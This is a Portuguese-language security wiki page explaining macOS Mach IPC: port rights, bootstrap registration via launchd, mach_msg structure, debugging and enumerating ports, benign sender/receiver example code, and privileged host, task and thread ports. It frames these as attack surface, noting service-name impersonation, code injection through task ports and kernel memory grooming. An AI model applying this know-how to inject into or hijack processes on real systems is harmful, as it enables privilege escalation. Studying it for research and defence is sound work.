# macOS IPC - Comunicação entre Processos

{{#include ../../../../banners/hacktricks-training.md}}

## Mensagens Mach via Portas

### Informações Básicas

Mach usa **tarefas** como a **menor unidade** para compartilhar recursos, e cada tarefa pode conter **múltiplas threads**. Essas **tarefas e threads são mapeadas 1:1 para processos e threads POSIX**.

A comunicação entre tarefas ocorre via Comunicação Inter-Processos Mach (IPC), utilizando canais de comunicação unidirecionais. **Mensagens são transferidas entre portas**, que atuam como **filas de mensagens** gerenciadas pelo kernel.

Uma **porta** é o **elemento básico** do IPC Mach. Ela pode ser usada para **enviar mensagens e recebê-las**.

Cada processo tem uma **tabela IPC**, onde é possível encontrar as **portas mach do processo**. O nome de uma porta mach é, na verdade, um número (um ponteiro para o objeto do kernel).

Um processo também pode enviar um nome de porta com alguns direitos **para uma tarefa diferente** e o kernel fará com que essa entrada na **tabela IPC da outra tarefa** apareça.

### Direitos de Porta

Os direitos de porta, que definem quais operações uma tarefa pode realizar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são ([definições daqui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Direito de Receber**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um único consumidor), o que significa que pode haver apenas **um direito de receber para cada porta** em todo o sistema (diferente de pipes, onde múltiplos processos podem manter descritores de arquivo para a extremidade de leitura de um pipe).
- Uma **tarefa com o Direito de Receber** pode receber mensagens e **criar Direitos de Envio**, permitindo que ela envie mensagens. Originalmente, apenas a **própria tarefa tem o Direito de Receber sobre sua porta**.
- Se o proprietário do Direito de Receber **morrer** ou matá-lo, o **direito de envio se torna inútil (nome morto).**
- **Direito de Enviar**, que permite enviar mensagens para a porta.
- O Direito de Enviar pode ser **clonado**, de modo que uma tarefa que possui um Direito de Enviar pode clonar o direito e **concedê-lo a uma terceira tarefa**.
- Note que **direitos de porta** também podem ser **passados** através de mensagens Mach.
- **Direito de Enviar uma vez**, que permite enviar uma mensagem para a porta e depois desaparece.
- Este direito **não pode** ser **clonado**, mas pode ser **movido**.
- **Direito de conjunto de portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Conjuntos de portas podem ser usados para escutar em várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
- **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se tornam nomes mortos.

**Tarefas podem transferir direitos de ENVIO para outras**, permitindo que elas enviem mensagens de volta. **Direitos de ENVIO também podem ser clonados, então uma tarefa pode duplicar e dar o direito a uma terceira tarefa**. Isso, combinado com um processo intermediário conhecido como **servidor de inicialização**, permite uma comunicação eficaz entre tarefas.

### Portas de Arquivo

Portas de arquivo permitem encapsular descritores de arquivo em portas Mach (usando direitos de porta Mach). É possível criar um `fileport` a partir de um FD dado usando `fileport_makeport` e criar um FD a partir de um fileport usando `fileport_makefd`.

### Estabelecendo uma comunicação

Como mencionado anteriormente, é possível enviar direitos usando mensagens Mach, no entanto, você **não pode enviar um direito sem já ter um direito** para enviar uma mensagem Mach. Então, como a primeira comunicação é estabelecida?

Para isso, o **servidor de inicialização** (**launchd** no mac) está envolvido, já que **qualquer um pode obter um direito de ENVIO para o servidor de inicialização**, é possível pedir a ele um direito para enviar uma mensagem para outro processo:

1. A tarefa **A** cria uma **nova porta**, obtendo o **DIREITO DE RECEBER** sobre ela.
2. A tarefa **A**, sendo a detentora do direito de RECEBER, **gera um DIREITO DE ENVIO para a porta**.
3. A tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, e **envia a ele o DIREITO DE ENVIO** para a porta que gerou no início.
- Lembre-se de que qualquer um pode obter um direito de ENVIO para o servidor de inicialização.
4. A tarefa A envia uma mensagem `bootstrap_register` para o servidor de inicialização para **associar a porta dada a um nome** como `com.apple.taska`
5. A tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização pelo nome do serviço** (`bootstrap_lookup`). Assim, para que o servidor de inicialização possa responder, a tarefa B enviará a ele um **DIREITO DE ENVIO para uma porta que criou anteriormente** dentro da mensagem de busca. Se a busca for bem-sucedida, o **servidor duplica o DIREITO DE ENVIO** recebido da Tarefa A e **transmite para a Tarefa B**.
- Lembre-se de que qualquer um pode obter um direito de ENVIO para o servidor de inicialização.
6. Com esse DIREITO DE ENVIO, a **Tarefa B** é capaz de **enviar** uma **mensagem** **para a Tarefa A**.
7. Para uma comunicação bidirecional, geralmente a tarefa **B** gera uma nova porta com um **DIREITO DE RECEBER** e um **DIREITO DE ENVIO**, e dá o **DIREITO DE ENVIO para a Tarefa A** para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).

O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **impersonar qualquer tarefa do sistema**, como falsamente **reivindicando um nome de serviço de autorização** e, em seguida, aprovando cada solicitação.

Então, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios **protegidos pelo SIP**: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Juntamente com cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização criará e manterá um **DIREITO DE RECEBER para cada um desses nomes de serviço**.

Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. Quando um nome de serviço está sendo buscado, o launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

- A tarefa **B** inicia uma **busca de inicialização** por um nome de serviço.
- **launchd** verifica se a tarefa está em execução e, se não estiver, **inicia**.
- A tarefa **A** (o serviço) realiza um **check-in de inicialização** (`bootstrap_check_in()`). Aqui, o **servidor de inicialização** cria um direito de ENVIO, retém-o e **transfere o direito de RECEBER para a Tarefa A**.
- O launchd duplica o **DIREITO DE ENVIO e o envia para a Tarefa B**.
- A tarefa **B** gera uma nova porta com um **DIREITO DE RECEBER** e um **DIREITO DE ENVIO**, e dá o **DIREITO DE ENVIO para a Tarefa A** (o svc) para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).

No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. Tarefas não do sistema ainda operam como descrito originalmente, o que poderia potencialmente permitir a impersonação.

> [!CAUTION]
> Portanto, o launchd nunca deve travar ou todo o sistema irá travar.

### Uma Mensagem Mach

[Encontre mais informações aqui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

A função `mach_msg`, essencialmente uma chamada de sistema, é utilizada para enviar e receber mensagens Mach. A função requer que a mensagem a ser enviada seja o argumento inicial. Esta mensagem deve começar com uma estrutura `mach_msg_header_t`, seguida pelo conteúdo real da mensagem. A estrutura é definida da seguinte forma:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processos que possuem um _**direito de recebimento**_ podem receber mensagens em uma porta Mach. Por outro lado, os **remetentes** recebem um _**direito de envio**_ ou um _**direito de envio-uma-vez**_. O direito de envio-uma-vez é exclusivamente para enviar uma única mensagem, após a qual se torna inválido.

O campo inicial **`msgh_bits`** é um bitmap:

- O primeiro bit (mais significativo) é usado para indicar que uma mensagem é complexa (mais sobre isso abaixo)
- O 3º e 4º são usados pelo kernel
- Os **5 bits menos significativos do 2º byte** podem ser usados para **voucher**: outro tipo de porta para enviar combinações de chave/valor.
- Os **5 bits menos significativos do 3º byte** podem ser usados para **porta local**
- Os **5 bits menos significativos do 4º byte** podem ser usados para **porta remota**

Os tipos que podem ser especificados no voucher, portas locais e remotas são (de [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Por exemplo, `MACH_MSG_TYPE_MAKE_SEND_ONCE` pode ser usado para **indicar** que um **direito de envio uma vez** deve ser derivado e transferido para este porto. Também pode ser especificado `MACH_PORT_NULL` para impedir que o destinatário possa responder.

Para alcançar uma fácil **comunicação bidirecional**, um processo pode especificar um **porto mach** no **cabeçalho da mensagem** mach chamado de _porto de resposta_ (**`msgh_local_port`**) onde o **destinatário** da mensagem pode **enviar uma resposta** a esta mensagem.

> [!TIP]
> Note que esse tipo de comunicação bidirecional é usado em mensagens XPC que esperam uma resposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Mas **geralmente diferentes portas são criadas** como explicado anteriormente para criar a comunicação bidirecional.

Os outros campos do cabeçalho da mensagem são:

- `msgh_size`: o tamanho de todo o pacote.
- `msgh_remote_port`: a porta na qual esta mensagem é enviada.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: o ID desta mensagem, que é interpretado pelo destinatário.

> [!CAUTION]
> Note que **as mensagens mach são enviadas através de um `mach port`**, que é um canal de comunicação **de um único receptor**, **múltiplos remetentes** embutido no kernel mach. **Múltiplos processos** podem **enviar mensagens** para um porto mach, mas em qualquer momento apenas **um único processo pode ler** dele.

As mensagens são então formadas pelo cabeçalho **`mach_msg_header_t`** seguido pelo **corpo** e pelo **trailer** (se houver) e pode conceder permissão para responder a ele. Nesses casos, o kernel apenas precisa passar a mensagem de uma tarefa para a outra.

Um **trailer** é **informação adicionada à mensagem pelo kernel** (não pode ser definido pelo usuário) que pode ser solicitada na recepção da mensagem com as flags `MACH_RCV_TRAILER_<trailer_opt>` (há diferentes informações que podem ser solicitadas).

#### Mensagens Complexas

No entanto, existem outras mensagens mais **complexas**, como aquelas que passam direitos de porta adicionais ou compartilham memória, onde o kernel também precisa enviar esses objetos ao destinatário. Nesses casos, o bit mais significativo do cabeçalho `msgh_bits` é definido.

Os possíveis descritores a serem passados são definidos em [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Em 32 bits, todos os descritores têm 12B e o tipo de descritor está no 11º. Em 64 bits, os tamanhos variam.

> [!CAUTION]
> O kernel copiará os descritores de uma tarefa para outra, mas primeiro **criando uma cópia na memória do kernel**. Essa técnica, conhecida como "Feng Shui", foi abusada em vários exploits para fazer o **kernel copiar dados em sua memória**, fazendo um processo enviar descritores para si mesmo. Então, o processo pode receber as mensagens (o kernel as liberará).
>
> Também é possível **enviar direitos de porta para um processo vulnerável**, e os direitos de porta simplesmente aparecerão no processo (mesmo que ele não esteja lidando com eles).

### APIs de Mac Ports

Note que as portas estão associadas ao namespace da tarefa, então para criar ou buscar uma porta, o namespace da tarefa também é consultado (mais em `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Criar** uma porta.
- `mach_port_allocate` também pode criar um **conjunto de portas**: direito de recebimento sobre um grupo de portas. Sempre que uma mensagem é recebida, é indicado de qual porta ela veio.
- `mach_port_allocate_name`: Mudar o nome da porta (por padrão, um inteiro de 32 bits)
- `mach_port_names`: Obter nomes de portas de um alvo
- `mach_port_type`: Obter direitos de uma tarefa sobre um nome
- `mach_port_rename`: Renomear uma porta (como dup2 para FDs)
- `mach_port_allocate`: Alocar um novo RECEIVE, PORT_SET ou DEAD_NAME
- `mach_port_insert_right`: Criar um novo direito em uma porta onde você tem RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funções usadas para **enviar e receber mensagens mach**. A versão de sobrescrita permite especificar um buffer diferente para a recepção de mensagens (a outra versão apenas reutilizará).

### Depurar mach_msg

Como as funções **`mach_msg`** e **`mach_msg_overwrite`** são as usadas para enviar e receber mensagens, definir um ponto de interrupção nelas permitiria inspecionar as mensagens enviadas e recebidas.

Por exemplo, comece a depurar qualquer aplicativo que você possa depurar, pois ele carregará **`libSystem.B`, que usará essa função**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Para obter os argumentos de **`mach_msg`**, verifique os registradores. Estes são os argumentos (de [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Obtenha os valores dos registros:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Inspecione o cabeçalho da mensagem verificando o primeiro argumento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Esse tipo de `mach_msg_bits_t` é muito comum para permitir uma resposta.

### Enumerar portas
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
O **nome** é o nome padrão dado à porta (verifique como está **aumentando** nos primeiros 3 bytes). O **`ipc-object`** é o **identificador** único **ofuscado** da porta.\
Note também como as portas com apenas o direito de **`send`** estão **identificando o proprietário** dela (nome da porta + pid).\
Também note o uso de **`+`** para indicar **outras tarefas conectadas à mesma porta**.

Também é possível usar [**procesxp**](https://www.newosxbook.com/tools/procexp.html) para ver também os **nomes de serviços registrados** (com SIP desativado devido à necessidade de `com.apple.system-task-port`):
```
procesp 1 ports
```
Você pode instalar esta ferramenta no iOS baixando-a de [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemplo de código

Note como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de bootstrap**, enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Portas Privilegiadas

Existem algumas portas especiais que permitem **realizar certas ações sensíveis ou acessar certos dados sensíveis** caso uma tarefa tenha as permissões de **SEND** sobre elas. Isso torna essas portas muito interessantes do ponto de vista de um atacante, não apenas por causa das capacidades, mas porque é possível **compartilhar permissões de SEND entre tarefas**.

### Portas Especiais do Host

Essas portas são representadas por um número.

Os direitos de **SEND** podem ser obtidos chamando **`host_get_special_port`** e os direitos de **RECEIVE** chamando **`host_set_special_port`**. No entanto, ambas as chamadas requerem a porta **`host_priv`**, que apenas o root pode acessar. Além disso, no passado, o root podia chamar **`host_set_special_port`** e sequestrar arbitrariamente, o que permitia, por exemplo, contornar assinaturas de código ao sequestrar `HOST_KEXTD_PORT` (o SIP agora impede isso).

Essas portas são divididas em 2 grupos: As **primeiras 7 portas são de propriedade do kernel**, sendo a 1 `HOST_PORT`, a 2 `HOST_PRIV_PORT`, a 3 `HOST_IO_MASTER_PORT` e a 7 é `HOST_MAX_SPECIAL_KERNEL_PORT`.\
As que começam **a partir** do número **8** são **de propriedade de daemons do sistema** e podem ser encontradas declaradas em [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Porta do Host**: Se um processo tiver privilégio de **SEND** sobre esta porta, ele pode obter **informações** sobre o **sistema** chamando suas rotinas como:
- `host_processor_info`: Obter informações do processador
- `host_info`: Obter informações do host
- `host_virtual_physical_table_info`: Tabela de páginas Virtual/Física (requer MACH_VMDEBUG)
- `host_statistics`: Obter estatísticas do host
- `mach_memory_info`: Obter layout de memória do kernel
- **Porta Priv do Host**: Um processo com direito de **SEND** sobre esta porta pode realizar **ações privilegiadas** como mostrar dados de inicialização ou tentar carregar uma extensão de kernel. O **processo precisa ser root** para obter essa permissão.
- Além disso, para chamar a API **`kext_request`**, é necessário ter outros direitos **`com.apple.private.kext*`**, que são concedidos apenas a binários da Apple.
- Outras rotinas que podem ser chamadas são:
- `host_get_boot_info`: Obter `machine_boot_info()`
- `host_priv_statistics`: Obter estatísticas privilegiadas
- `vm_allocate_cpm`: Alocar Memória Física Contígua
- `host_processors`: Direito de enviar para processadores do host
- `mach_vm_wire`: Tornar a memória residente
- Como o **root** pode acessar essa permissão, ele poderia chamar `host_set_[special/exception]_port[s]` para **sequestrar portas especiais ou de exceção do host**.

É possível **ver todas as portas especiais do host** executando:
```bash
procexp all ports | grep "HSP"
```
### Portas Especiais de Tarefa

Estas são portas reservadas para serviços bem conhecidos. É possível obter/configurá-las chamando `task_[get/set]_special_port`. Elas podem ser encontradas em `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
- **TASK_KERNEL_PORT**\[task-self send right]: A porta usada para controlar esta tarefa. Usada para enviar mensagens que afetam a tarefa. Esta é a porta retornada por **mach_task_self (veja Tarefas de Porta abaixo)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: A porta de bootstrap da tarefa. Usada para enviar mensagens solicitando o retorno de outras portas de serviço do sistema.
- **TASK_HOST_NAME_PORT**\[host-self send right]: A porta usada para solicitar informações do host que contém. Esta é a porta retornada por **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: A porta que nomeia a fonte da qual esta tarefa obtém sua memória de kernel fixa.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: A porta que nomeia a fonte da qual esta tarefa obtém sua memória gerenciada padrão.

### Tarefas de Porta

Originalmente, Mach não tinha "processos", tinha "tarefas", que eram consideradas mais como um contêiner de threads. Quando Mach foi fundido com o BSD, **cada tarefa foi correlacionada com um processo BSD**. Portanto, cada processo BSD tem os detalhes que precisa para ser um processo e cada tarefa Mach também tem seu funcionamento interno (exceto pelo pid inexistente 0, que é o `kernel_task`).

Existem duas funções muito interessantes relacionadas a isso:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Obtém um direito de ENVIO para a porta da tarefa relacionada ao especificado pelo `pid` e o dá à `target_task_port` indicada (que geralmente é a tarefa chamadora que usou `mach_task_self()`, mas pode ser uma porta de ENVIO sobre uma tarefa diferente).
- `pid_for_task(task, &pid)`: Dado um direito de ENVIO a uma tarefa, encontra a qual PID esta tarefa está relacionada.

Para realizar ações dentro da tarefa, a tarefa precisava de um direito de `SEND` para si mesma chamando `mach_task_self()` (que usa o `task_self_trap` (28)). Com esta permissão, uma tarefa pode realizar várias ações, como:

- `task_threads`: Obter direito de ENVIO sobre todas as portas de tarefa das threads da tarefa
- `task_info`: Obter informações sobre uma tarefa
- `task_suspend/resume`: Suspender ou retomar uma tarefa
- `task_[get/set]_special_port`
- `thread_create`: Criar uma thread
- `task_[get/set]_state`: Controlar o estado da tarefa
- e mais pode ser encontrado em [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Observe que com um direito de ENVIO sobre uma porta de tarefa de uma **tarefa diferente**, é possível realizar tais ações sobre uma tarefa diferente.

Além disso, a task_port também é a **`vm_map`** porta que permite **ler e manipular memória** dentro de uma tarefa com funções como `vm_read()` e `vm_write()`. Isso basicamente significa que uma tarefa com direitos de ENVIO sobre a task_port de uma tarefa diferente será capaz de **injetar código nessa tarefa**.

Lembre-se de que, como o **kernel também é uma tarefa**, se alguém conseguir obter **permissões de ENVIO** sobre o **`kernel_task`**, poderá fazer o kernel executar qualquer coisa (jailbreaks).

- Chame `mach_task_self()` para **obter o nome** para esta porta para a tarefa chamadora. Esta porta é apenas **herdada** através de **`exec()`**; uma nova tarefa criada com `fork()` obtém uma nova porta de tarefa (como um caso especial, uma tarefa também obtém uma nova porta de tarefa após `exec()` em um binário suid). A única maneira de gerar uma tarefa e obter sua porta é realizar a ["dança de troca de porta"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) enquanto faz um `fork()`.
- Estas são as restrições para acessar a porta (do `macos_task_policy` do binário `AppleMobileFileIntegrity`):
- Se o aplicativo tiver a **`com.apple.security.get-task-allow` entitlement**, processos do **mesmo usuário podem acessar a porta da tarefa** (comumente adicionada pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
- Aplicativos com a **`com.apple.system-task-ports`** entitlement podem obter a **porta da tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamada de **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
- **Root pode acessar portas de tarefa** de aplicativos **não** compilados com um **runtime endurecido** (e não da Apple).

**A porta do nome da tarefa:** Uma versão não privilegiada da _porta da tarefa_. Ela referencia a tarefa, mas não permite controlá-la. A única coisa que parece estar disponível através dela é `task_info()`.

### Portas de Thread

As threads também têm portas associadas, que são visíveis a partir da tarefa chamando **`task_threads`** e do processador com `processor_set_threads`. Um direito de ENVIO à porta da thread permite usar a função do subsistema `thread_act`, como:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

